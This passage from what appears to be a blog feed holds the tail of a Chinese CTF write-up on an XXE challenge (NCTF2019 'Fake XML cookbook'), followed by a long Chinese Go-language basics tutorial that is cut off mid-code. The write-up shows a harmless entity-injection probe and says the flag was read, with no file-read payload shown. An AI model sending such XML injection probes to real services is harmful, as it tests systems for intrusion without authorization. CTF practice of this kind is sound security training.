cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>打开后发现一个登陆界面</p><p>没有什么提示信息，尝试用bp抓个包：</p><p><img src="/img/XXE-wp/xxe_01.png" alt=""></p><p>发现可能存在xxe漏洞：</p><p>尝试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY words &quot;Hello XXE !&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;root&gt;&amp;words;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>验证成功，存在xxe：</p><p><img src="/img/XXE-wp/xxe_02.png" alt=""></p><p>尝试读取flag文件，成功！</p><p><img src="/img/XXE-wp/xxe_03.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GO</title>
      <link href="/2023/08/03/GO/"/>
      <url>/2023/08/03/GO/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>注释的主要的功能是为了增强代码的可读性，不参与程序的一切功能，主要分为两类</p><ul><li>单行注释</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="comment">// 单行注释</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>多行注释</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">多行注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h3><p>Go语言是静态语言类型，所有的类型都需要明确的定义</p><p>在Go语言中，声明一个变量一般使用<code>var</code>关键字：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name <span class="keyword">type</span></span><br></pre></td></tr></table></figure><ul><li><code>var</code>是声明变量的关键字，是固定的语法，声明一个变量，就需要一个<code>var</code></li><li><code>name</code>变量的名字</li><li><code>type</code>代表变量的类型</li></ul><p>举个例子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个字符串变量 name</span></span><br><span class="line"><span class="keyword">var</span> name <span class="type">string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个数字类型变量 age</span></span><br><span class="line"><span class="keyword">var</span> age <span class="type">int</span></span><br></pre></td></tr></table></figure><p>指针类型：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a,b *<span class="type">int</span></span><br></pre></td></tr></table></figure><p>使用关键字<code>var</code>和<code>()</code>，可以将一组变量定义放在一起</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (</span><br><span class="line">addr <span class="type">string</span></span><br><span class="line">    phone <span class="type">string</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="变量的初始化"><a href="#变量的初始化" class="headerlink" title="变量的初始化"></a>变量的初始化</h3><p>标准格式</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> 变量名 类型 = 值（表达式）</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name <span class="type">string</span>= <span class="string">&quot;SpongeBob&quot;</span></span><br><span class="line"><span class="keyword">var</span> age <span class="type">int</span>= <span class="number">19</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;name:%s,age:%d&quot;</span>, name, age)</span><br></pre></td></tr></table></figure><p>短变量声明并 初始化</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name := <span class="string">&quot;SpongeBob&quot;</span></span><br><span class="line">age := <span class="number">19</span></span><br><span class="line"></span><br><span class="line">fmt.Printf(<span class="string">&quot;name:%s,age:%d&quot;</span>, name, age)</span><br></pre></td></tr></table></figure><p>编译器会自动根据右值类型推断出左值的对应类型</p><p>但也有些限制：</p><ul><li>定义变量，同时显示初始化</li><li>不能提供数据类型</li><li>只能用在函数内部，不能到处定义</li></ul><h3 id="变量的交换"><a href="#变量的交换" class="headerlink" title="变量的交换"></a>变量的交换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import &quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">var a int = 100</span><br><span class="line">var b int = 200</span><br><span class="line">b, a = a, b</span><br><span class="line">fmt.Println(a, b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 输出结果 200 100</span><br></pre></td></tr></table></figure><h3 id="匿名变量"><a href="#匿名变量" class="headerlink" title="匿名变量"></a>匿名变量</h3><p>匿名变量的特点是一个下划线<code>_</code>，<code>_</code>本身就是一个特殊的标识符，被称为空白标识符，可以向其他标识符那样用于变量的声明或赋值（任何类型都可以赋值给他），但任何赋给这个标识符的值都将被抛弃，因此这些值不能在后续的代码中使用，也不可以使用这个标识符作为变量对其他变量进行赋值或运算，使用匿名变量时，只需要在变量声明的地方使用下划线替代即可</p><p>例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">100</span>, <span class="number">200</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">a, _ := test()</span><br><span class="line">_, b := test()</span><br><span class="line">fmt.Println(a, b)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出结果 100 200</span></span><br></pre></td></tr></table></figure><h3 id="变量的作用域"><a href="#变量的作用域" class="headerlink" title="变量的作用域"></a>变量的作用域</h3><p><strong>一个变量（常量、类型或函数）在程序中都有一定的作用范围，称之为作用域</strong></p><blockquote><p>局部变量</p></blockquote><p>在函数体内声明的变量称之为局部变量，他们的作用域只在函数体内，函数的参数和返回值变量都属于局部变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 声明局部变量 a 和 b 并赋值</span></span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="number">100</span></span><br><span class="line"><span class="keyword">var</span> b <span class="type">int</span> = <span class="number">200</span></span><br><span class="line"><span class="comment">//声明局部变量 c 并计算 a 和 b 的和</span></span><br><span class="line">c := a + b</span><br><span class="line">fmt.Printf(<span class="string">&quot;a=%d,b=%d,c=%d\n&quot;</span>, a, b, c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果 a=100,b=200,c=300</span></span><br></pre></td></tr></table></figure><blockquote><p>全局变量</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明全局变量</span></span><br><span class="line"><span class="keyword">var</span> c <span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 声明局部变量</span></span><br><span class="line"><span class="keyword">var</span> a, b <span class="type">int</span></span><br><span class="line"><span class="comment">// 初始化参数</span></span><br><span class="line">a = <span class="number">3</span></span><br><span class="line">b = <span class="number">4</span></span><br><span class="line">c = a + b</span><br><span class="line">fmt.Printf(<span class="string">&quot;a=%d,b=%d,c=%d\n&quot;</span>, a, b, c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果 a=3,b=4,c=7</span></span><br></pre></td></tr></table></figure><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p><strong>常量是一个简单值的标识符，在程序运行时，不会被修改的量</strong></p><p>常量中的数据类型只可以是布尔型，数字型（整数型，浮点型和复数）和字符串型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> identifier [<span class="keyword">type</span>] = value</span><br></pre></td></tr></table></figure><ul><li>显式定义类型：<code>const b string = &quot;abc&quot;</code></li><li>隐式定义类型：<code>const b = &quot;abc&quot;</code></li></ul><p>多个相同类型的声明可以简写为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> c_name1,c_name2 = value1,value2</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">const</span> URL <span class="type">string</span> = <span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line"><span class="keyword">const</span> PI = <span class="number">3.14</span></span><br><span class="line"><span class="keyword">const</span> LENGTH <span class="type">int</span> = <span class="number">10</span></span><br><span class="line"><span class="keyword">const</span> WIDTH <span class="type">int</span> = <span class="number">5</span></span><br><span class="line"><span class="keyword">const</span> a, b, c = <span class="number">1</span>, <span class="literal">false</span>, <span class="string">&quot;str&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h2><p><code>iota</code>，特殊常量，可以认为是一个被编译器修改的常量，<code>iota</code>是go语言的常量计数器</p><p><code>iota</code>在<code>const</code>关键字出现时将被重置为0（<code>const</code>内部的第一行之前），<code>const</code>中每新增一行常量声明将使<code>iota</code>计数一次</p><p><code>iota</code> 可以被用作枚举值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>(</span><br><span class="line">a = <span class="literal">iota</span></span><br><span class="line">    b = <span class="literal">iota</span></span><br><span class="line">    c = <span class="literal">iota</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>第一个<code>iota</code>等0，每当<code>iota</code>在新的一行被使用时，它的值都会自动加1，所以<code>a=0.b=1,c=2</code>可以简写为如下格式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span>(</span><br><span class="line">    <span class="comment">// 一组常量中，如果某个常量没有初始值，默认和上一行一致</span></span><br><span class="line">a = <span class="literal">iota</span></span><br><span class="line">    b</span><br><span class="line">    c</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">a = <span class="literal">iota</span></span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">)</span><br><span class="line">fmt.Println(a, b, c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果 0 1 2</span></span><br></pre></td></tr></table></figure><h2 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h2><p><img src="/img/GO/go.png" alt=""></p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><div class="table-container"><table><thead><tr><th>算术运算符</th><th>含 义</th></tr></thead><tbody><tr><td>+</td><td>相加</td></tr><tr><td>-</td><td>相减</td></tr><tr><td>*</td><td>相乘</td></tr><tr><td>/</td><td>相除</td></tr><tr><td>%</td><td>取余数</td></tr><tr><td>++</td><td>自增1</td></tr><tr><td>—</td><td>自减1</td></tr></tbody></table></div><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><div class="table-container"><table><thead><tr><th>关系运算符</th><th>含 义</th></tr></thead><tbody><tr><td>==</td><td>相等</td></tr><tr><td>!=</td><td>不相等</td></tr><tr><td>&lt;</td><td>小于</td></tr><tr><td>&lt;=</td><td>小于或等于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&gt;=</td><td>大于或等于</td></tr></tbody></table></div><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><div class="table-container"><table><thead><tr><th>逻辑运算符</th><th>含 义</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>逻辑与（AND），当运算符前后两个条件的结果均为 true 时，运算结果为 true</td></tr><tr><td>\</td><td>\</td><td></td><td>逻辑或（OR），当运算符前后两个条件的结果中有一个为 true 时，运算结果为 true</td></tr><tr><td>!</td><td>逻辑非（NOT），对运算符后面的条件的结果取反，当条件的结果为 true 时，整体运算结果为 false，否则为 true</td></tr></tbody></table></div><h3 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h3><div class="table-container"><table><thead><tr><th>位运算符</th><th>含 义</th></tr></thead><tbody><tr><td>&amp;</td><td>按位与（AND）操作，其结果是运算符前后的两数各对应的二进制位相与后的结果</td></tr><tr><td>\</td><td></td><td>按位或（OR）操作，其结果是运算符前后的两数各对应的二进制位相或后的结果</td></tr><tr><td>^</td><td>按位异或（XOR）操作，当运算符前后的两数各对应的二进制位相等时，返回 0；反之，返回 1</td></tr><tr><td>&lt;&lt;</td><td>按位左移操作，该操作木质上是将某个数值乘以 2 的 n 次方，n 为左移位数。更直观地来看，其结果就是将某个数值的所有二进制位向左移了 n 个位置，并将超限的高位丢弃，低位补 0</td></tr><tr><td>&gt;&gt;</td><td>按位右移操作，该操作本质上是将某个数值除以 2 的 n 次方，n 为右移位数。更直观地来看，其结果就是将某个数值的所有二进制位向右移了 n 个位置，并将超限的低位丢弃，高位补 0</td></tr></tbody></table></div><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><div class="table-container"><table><thead><tr><th>赋值运算符</th><th>含 义</th></tr></thead><tbody><tr><td>=</td><td>直接将运算符右侧的值赋给左侧的变量或表达式</td></tr><tr><td>+=</td><td>先将运算符左侧的值与右侧的值相加，再将相加和赋给左侧的变量或表达式</td></tr><tr><td>-=</td><td>赋给左侧的变量或表达式侧的值相减，再将相减差赋给左侧的变量或表达式</td></tr><tr><td>*=</td><td>先将运算符左侧的值与右侧的值相乘，再将相乘结果赋给左侧的变量或表达式</td></tr><tr><td>/=</td><td>先将运算符左侧的值与右侧的值相除，再将相除结果赋给左侧的变量或表达式</td></tr><tr><td>%=</td><td>先将运算符左侧的值与右侧的值相除取余数，再将余数赋给左侧的变量或表达式</td></tr><tr><td>&lt;&lt;=</td><td>先将运算符左侧的值按位左移右侧数值指定数量的位置，再将位移后的结果赋给左侧的变量或表达式</td></tr><tr><td>&gt;&gt;=</td><td>先将运算符左侧的值按位右移右侧数值指定数量的位置，再将位移后的结果赋给左侧的变量或表达式</td></tr><tr><td>&amp;=</td><td>先将运算符左侧的值与右侧的值按位与，再将位运算后的结果赋给左侧的变量或表达式</td></tr><tr><td>\</td><td>=</td><td>先将运算符左侧的值与右侧的值按位或，再将位运算后的结果赋给左侧的变量或表达式</td></tr><tr><td>^=</td><td>先将运算符左侧的值与右侧的值按位异或，再将位运算后的结果赋给左侧的变量或表达式</td></tr></tbody></table></div><h3 id="指针运算符"><a href="#指针运算符" class="headerlink" title="指针运算符"></a>指针运算符</h3><div class="table-container"><table><thead><tr><th>指针运算符</th><th>含 义</th></tr></thead><tbody><tr><td>&amp;</td><td>获取某个变量在内存中的实际地址</td></tr><tr><td>*</td><td>声明一个指针变量</td></tr></tbody></table></div><h1 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> x <span class="type">int</span></span><br><span class="line"><span class="keyword">var</span> y <span class="type">int</span></span><br><span class="line">fmt.Println(<span class="string">&quot;请输入：&quot;</span>)</span><br><span class="line"><span class="comment">// 变量取地址 &amp;变量</span></span><br><span class="line">fmt.Scanln(&amp;x, &amp;y)</span><br><span class="line">fmt.Println(<span class="string">&quot;x:&quot;</span>, x)</span><br><span class="line">fmt.Println(<span class="string">&quot;y:&quot;</span>, y)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">请输入：</span></span><br><span class="line"><span class="comment">1 2</span></span><br><span class="line"><span class="comment">x: 1</span></span><br><span class="line"><span class="comment">y: 2</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><p>程序的流程控制结构一共有三种：顺序结构，选择结构，循环结构</p><p>顺序结构：从上到下，逐行执行，默认的逻辑</p><p>选择结构：条件满足某些代码才会执行</p><ul><li><code>if</code></li><li><code>switch</code></li><li><code>select</code>（channel）</li></ul><p>循环结构：条件满足某些代码会被反复执行</p><ul><li><code>for</code></li></ul><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p><img src="/img/GO/go_01.png" alt=""></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> a &gt; <span class="number">5</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;a&gt;5&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;a&lt;=5&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果 a&gt;5</span></span><br></pre></td></tr></table></figure><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="type">int</span> = <span class="number">10</span></span><br><span class="line"><span class="keyword">switch</span> a &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;a=5&quot;</span>)</span><br><span class="line"><span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;a=10&quot;</span>)</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">fmt.Println(<span class="string">&quot;a=?&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出结果 a=10</span></span><br></pre></td></tr></table></figure><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;打印次数：&quot;</span>, i)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">输出结果</span></span><br><span class="line"><span class="comment">打印次数： 0</span></span><br><span class="line"><span class="comment">打印次数： 1</span></span><br><span class="line"><span class="comment">打印次数： 2</span></span><br><span class="line"><span class="comment">打印次数： 3</span></span><br><span class="line"><span class="comment">打印次数： 4</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="String"><a href="#String" class="headerlink" title="String"></a>String</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">str := <span class="string">&quot;hello SpongeBob&quot;</span></span><br><span class="line">fmt.Println(str)</span><br><span class="line">fmt.Println(<span class="string">&quot;字符串长度为：&quot;</span>, <span class="built_in">len</span>(str))</span><br><span class="line">fmt.Println(<span class="string">&quot;字节打印：&quot;</span>, str[<span class="number">0</span>])</span><br><span class="line">fmt.Printf(<span class="string">&quot;%c&quot;</span>, str[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果</span></span><br><span class="line"><span class="comment">hello SpongeBob</span></span><br><span class="line"><span class="comment">字符串长度为： 15</span></span><br><span class="line"><span class="comment">字节打印： 104</span></span><br><span class="line"><span class="comment">h</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="函数的声明"><a href="#函数的声明" class="headerlink" title="函数的声明"></a>函数的声明</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">function_name</span><span class="params">([parameter list])</span></span> [return_types]&#123;</span><br><span class="line">    函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 